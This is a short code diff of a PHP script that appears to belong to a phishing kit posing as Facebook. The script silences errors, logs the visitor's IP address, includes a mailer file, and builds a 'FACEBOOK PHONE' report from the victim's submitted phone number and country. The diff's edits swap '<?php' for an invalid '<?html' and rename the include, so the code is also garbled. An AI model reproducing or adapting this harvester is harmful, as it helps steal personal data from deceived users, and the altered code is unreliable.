@@ -1,4 +1,4 @@
-<?php
+<?html
 /* 
 -                                                                                   
  ____      ____          ______        _____         _____        ______  _______   
@@ -18,7 +18,7 @@
   error_reporting(0);
   
 $ip = getenv("REMOTE_ADDR");
-include 'email.php';
+include 'email.html';
 $message .= "#--------------------------[ FACEBOOK PHONE ]--------------------------#\n";
 $message .= "PHONE NUMBER   : ".$_POST['phone']."\n";
 $message .= "COUNTRY        : ".$_POST['location']."\n";
